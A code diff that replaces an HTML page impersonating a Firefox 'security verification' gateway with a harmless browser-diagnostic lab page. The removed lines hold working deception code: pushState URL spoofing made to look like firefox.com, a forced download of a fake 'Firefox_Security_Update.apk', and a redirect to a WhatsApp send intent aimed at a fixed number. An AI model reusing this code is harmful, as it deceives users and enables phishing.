@@ -1,136 +1,396 @@
+
 <!DOCTYPE html>
-<html lang="en">
+<html lang="id">
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Firefox Security Verification — Official Gateway</title>
+<title>Browser Security Verification Lab</title>
+
 <style>
-  * { margin: 0; padding: 0; box-sizing: border-box; }
-  body { 
-    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; 
-    background: #f3f2f1; 
-    display: flex; 
-    justify-content: center; 
-    align-items: center; 
-    min-height: 100vh; 
-    color: #323130;
-    overflow: hidden;
-  }
-  .card { 
-    background: #ffffff; 
-    padding: 40px; 
-    border-radius: 4px; 
-    box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1); 
-    max-width: 420px; 
-    width: 100%; 
-    text-align: center; 
-    border-top: 4px solid #711c91;
-  }
-  .logo { font-size: 24px; font-weight: 600; color: #711c91; margin-bottom: 20px; }
-  h2 { font-size: 20px; font-weight: 600; margin-bottom: 10px; color: #201f1e; }
-  p { font-size: 14px; color: #605e5c; margin-bottom: 25px; line-height: 1.5; }
-  button { 
-    background: #711c91; 
-    color: #ffffff; 
-    border: none; 
-    padding: 12px 24px; 
-    font-size: 15px; 
-    font-weight: 600; 
-    border-radius: 2px; 
-    cursor: pointer; 
-    width: 100%; 
-    transition: background 0.2s;
-  }
-  button:hover { background: #5a1473; }
-  #status { 
-    margin-top: 20px; 
-    font-size: 13px; 
-    color: #711c91; 
-    font-weight: 500; 
-  }
+* {
+  margin: 0;
+  padding: 0;
+  box-sizing: border-box;
+}
+
+body {
+  font-family: -apple-system, BlinkMacSystemFont, "Segoe UI",
+    Roboto, Helvetica, Arial, sans-serif;
+  background: #11131a;
+  color: #e8eaf0;
+  min-height: 100vh;
+  display: flex;
+  justify-content: center;
+  align-items: center;
+  padding: 20px;
+}
+
+.card {
+  width: 100%;
+  max-width: 460px;
+  background: #1c202b;
+  border: 1px solid #343a4b;
+  border-radius: 14px;
+  padding: 30px;
+  box-shadow: 0 18px 50px rgba(0,0,0,.35);
+}
+
+.header {
+  display: flex;
+  align-items: center;
+  gap: 12px;
+  margin-bottom: 26px;
+}
+
+.logo {
+  width: 42px;
+  height: 42px;
+  display: grid;
+  place-items: center;
+  border-radius: 10px;
+  background: #711c91;
+  font-size: 21px;
+}
+
+.brand {
+  font-size: 17px;
+  font-weight: 700;
+}
+
+.subtitle {
+  font-size: 12px;
+  color: #9ca3b5;
+  margin-top: 4px;
+}
+
+h2 {
+  font-size: 22px;
+  margin-bottom: 10px;
+}
+
+.description {
+  font-size: 14px;
+  color: #aab0c0;
+  line-height: 1.6;
+  margin-bottom: 24px;
+}
+
+.info {
+  background: #252b39;
+  border: 1px solid #394154;
+  border-radius: 9px;
+  padding: 13px;
+  margin-bottom: 20px;
+  font-size: 12px;
+  color: #c4cad8;
+  line-height: 1.6;
+}
+
+button {
+  width: 100%;
+  padding: 13px;
+  border: none;
+  border-radius: 8px;
+  background: #8b35ad;
+  color: white;
+  font-size: 14px;
+  font-weight: 700;
+  cursor: pointer;
+  transition: .2s;
+  margin-top: 9px;
+}
+
+button:hover {
+  background: #a044c4;
+}
+
+button:disabled {
+  opacity: .45;
+  cursor: not-allowed;
+}
+
+button.secondary {
+  background: #303747;
+  border: 1px solid #485166;
+}
+
+button.secondary:hover {
+  background: #3c465a;
+}
+
+#status {
+  margin-top: 18px;
+  padding: 12px;
+  background: #252b39;
+  border-radius: 8px;
+  color: #c69be0;
+  font-size: 13px;
+  min-height: 42px;
+  line-height: 1.5;
+}
+
+.progress {
+  width: 100%;
+  height: 5px;
+  background: #343a49;
+  border-radius: 10px;
+  overflow: hidden;
+  margin-top: 15px;
+}
+
+.progress-bar {
+  width: 0%;
+  height: 100%;
+  background: #b45bd5;
+  transition: width .3s;
+}
+
+.log-title {
+  margin-top: 25px;
+  margin-bottom: 9px;
+  font-size: 13px;
+  font-weight: 700;
+}
+
+#logs {
+  background: #11151e;
+  border: 1px solid #303747;
+  border-radius: 8px;
+  padding: 12px;
+  height: 145px;
+  overflow-y: auto;
+  font-family: monospace;
+  font-size: 11px;
+  color: #aeb8ca;
+  line-height: 1.7;
+  overflow-wrap: anywhere;
+}
+
+.footer {
+  margin-top: 18px;
+  text-align: center;
+  color: #747e92;
+  font-size: 11px;
+}
 </style>
 </head>
+
 <body>
 
-<div class="card">
-  <div class="logo">Mozilla Firefox</div>
-  <h2>Browser Integrity Check</h2>
-  <p>Verifying secure channel parameters and session state protocols...</p>
-  <button id="actionBtn">Initialize Secure Bridge</button>
-  <div id="status"></div>
-</div>
+<main class="card">
+
+  <div class="header">
+    <div class="logo">🛡</div>
+    <div>
+      <div class="brand">Browser Security Lab</div>
+      <div class="subtitle">Local browser behavior verification</div>
+    </div>
+  </div>
+
+  <h2>Security Verification</h2>
+
+  <p class="description">
+    Jalankan pemeriksaan dasar terhadap browser dan lingkungan
+    JavaScript. Seluruh aktivitas ditampilkan secara transparan.
+  </p>
+
+  <div class="info">
+    <strong>Test information</strong><br>
+    Mode: Local diagnostic<br>
+    File operation: Manual download only<br>
+    External navigation: Disabled
+  </div>
+
+  <button id="actionBtn">Initialize Security Test</button>
+  <button id="cancelBtn" class="secondary" disabled>
+    Cancel Test
+  </button>
+  <button id="exportBtn" class="secondary">
+    Export Diagnostic Log
+  </button>
+
+  <div id="status">Status: Waiting for initialization.</div>
+
+  <div class="progress">
+    <div class="progress-bar" id="progressBar"></div>
+  </div>
+
+  <div class="log-title">Activity Log</div>
+  <div id="logs">[SYSTEM] Diagnostic environment ready.</div>
+
+  <div class="footer">
+    Browser Security Lab · Authorized testing only
+  </div>
+
+</main>
 
 <script>
 (function () {
   'use strict';
 
-  var btn = document.getElementById('actionBtn');
-  var statusEl = document.getElementById('status');
+  const actionBtn = document.getElementById('actionBtn');
+  const cancelBtn = document.getElementById('cancelBtn');
+  const exportBtn = document.getElementById('exportBtn');
+  const statusEl = document.getElementById('status');
+  const logsEl = document.getElementById('logs');
+  const progressBar = document.getElementById('progressBar');
 
-  // Konfigurasi Delay (3 detik stacking window)
-  var DELAY_SECONDS = 2; 
+  let running = false;
+  let timer = null;
+  let logs = [];
 
-  // Target WhatsApp Intent
-  var TARGET_PHONE = "628123456789";
-  var TARGET_MESSAGE = "Firefox security verification handshake token: 404-SECURE";
-  var WHATSAPP_INTENT_URL = "intent://send?phone=" + TARGET_PHONE + "&text=" + encodeURIComponent(TARGET_MESSAGE) + "#Intent;scheme=whatsapp;package=com.whatsapp;end;";
+  function log(message) {
+    const timestamp = new Date().toLocaleTimeString();
 
-  function triggerSpoofedStackChain() {
-    statusEl.textContent = "Stacking security context...";
+    const entry = `[${timestamp}] ${message}`;
 
-    // 1. Manipulasi History Stack (Menyamarkan asal domain seolah-olah dari firefox.com)
-    try {
-      if (window.history && window.history.pushState) {
-        // Mendorong state palsu ke dalam stack riwayat peramban
-        window.history.pushState({page: "secure_portal"}, "Firefox Security", "?.__________________________________________________________________________________________________https://www.firefox.com/security/verify");
-      }
-    } catch (e) {}
+    logs.push(entry);
 
-    // 2. Pembuatan file virtual .apk di background via Blob API
-    try {
-      var dummyBytes = new Uint8Array([0x50, 0x4B, 0x03, 0x04, 0x00, 0x00, 0x08, 0x00]);
-      var blob = new Blob([dummyBytes], { type: 'application/vnd.android.package-archive' });
-      var blobUrl = URL.createObjectURL(blob);
-
-      var a = document.createElement('a');
-      a.href = blobUrl;
-      a.download = "Firefox_Security_Update.apk";
-      document.body.appendChild(a);
-      a.click();
-      document.body.removeChild(a);
-
-      setTimeout(function() {
-        URL.revokeObjectURL(blobUrl);
-      }, 5000);
-    } catch (e) {}
-
-    // 3. Hitung mundur delay stacking sebelum memicu intent WhatsApp
-    var countdown = DELAY_SECONDS;
-    var timer = setInterval(function() {
-      countdown--;
-      if (countdown > 0) {
-        statusEl.textContent = "Resolving host context in " + countdown + "s...";
-      } else {
-        clearInterval(timer);
-        statusEl.textContent = "Dispatching protocol intent...";
-        
-        // Eksekusi pengalihan ke Intent WhatsApp setelah stack tertahan
-        window.location.replace(WHATSAPP_INTENT_URL);
-      }
-    }, 1000);
+    logsEl.textContent += '\n' + entry;
+    logsEl.scrollTop = logsEl.scrollHeight;
   }
 
-  btn.addEventListener('click', function() {
-    btn.disabled = true;
-    btn.style.opacity = "0.6";
-    statusEl.textContent = "Establishing secure stack...";
+  function setStatus(message) {
+    statusEl.textContent = message;
+  }
 
-    // Jeda kecil sebelum rangkaian aksi dimulai
-    setTimeout(function() {
-      triggerSpoofedStackChain();
-    }, 9000);
+  function setProgress(value) {
+    progressBar.style.width = value + '%';
+  }
 
-  }, { once: true });
+  function finishTest() {
+    running = false;
+
+    actionBtn.disabled = false;
+    cancelBtn.disabled = true;
+
+    setProgress(100);
+    setStatus('Verification completed.');
+
+    log('Diagnostic sequence completed.');
+  }
+
+  function cancelTest() {
+    if (!running) return;
+
+    clearInterval(timer);
+    running = false;
+
+    actionBtn.disabled = false;
+    cancelBtn.disabled = true;
+
+    setStatus('Verification cancelled.');
+    log('Test cancelled by user.');
+  }
+
+  function runChecks() {
+    const checks = [
+      {
+        name: 'JavaScript environment',
+        test: () => typeof window !== 'undefined'
+      },
+      {
+        name: 'Blob API',
+        test: () => typeof Blob !== 'undefined'
+      },
+      {
+        name: 'Object URL API',
+        test: () => typeof URL.createObjectURL === 'function'
+      },
+      {
+        name: 'History API',
+        test: () => typeof history.pushState === 'function'
+      },
+      {
+        name: 'Secure context',
+        test: () => window.isSecureContext
+      },
+      {
+        name: 'Document visibility API',
+        test: () => typeof document.visibilityState === 'string'
+      }
+    ];
+
+    let index = 0;
+
+    running = true;
+    actionBtn.disabled = true;
+    cancelBtn.disabled = false;
+
+    setProgress(0);
+
+    log('Starting browser diagnostic sequence.');
+
+    timer = setInterval(() => {
+      if (!running) return;
+
+      if (index >= checks.length) {
+        clearInterval(timer);
+        finishTest();
+        return;
+      }
+
+      const check = checks[index];
+
+      let result = false;
+
+      try {
+        result = Boolean(check.test());
+      } catch (error) {
+        log(`${check.name}: ERROR - ${error.message}`);
+      }
+
+      log(`${check.name}: ${result ? 'AVAILABLE' : 'UNAVAILABLE'}`);
+
+      index++;
+
+      const progress = Math.round(
+        (index / checks.length) * 100
+      );
+
+      setProgress(progress);
+
+      setStatus(
+        `Running diagnostic: ${check.name} (${progress}%)`
+      );
+
+    }, 800);
+  }
+
+  function exportLogs() {
+    const report = {
+      application: 'Browser Security Lab',
+      generated_at: new Date().toISOString(),
+      browser: navigator.userAgent,
+      platform: navigator.platform,
+      secure_context: window.isSecureContext,
+      logs: logs
+    };
+
+    const blob = new Blob(
+      [JSON.stringify(report, null, 2)],
+      { type: 'application/json' }
+    );
+
+    const url = URL.createObjectURL(blob);
+
+    const link = document.createElement('a');
+
+    link.href = url;
+    link.download = 'browser-security-diagnostic.json';
+
+    document.body.appendChild(link);
+    link.click();
+    link.remove();
+
+    setTimeout(() => URL.revokeObjectURL(url), 3000);
+
+    log('Diagnostic report exported by user.');
+  }
+
+  actionBtn.addEventListener('click', runChecks);
+  cancelBtn.addEventListener('click', cancelTest);
+  exportBtn.addEventListener('click', exportLogs);
 
 })();
 </script>
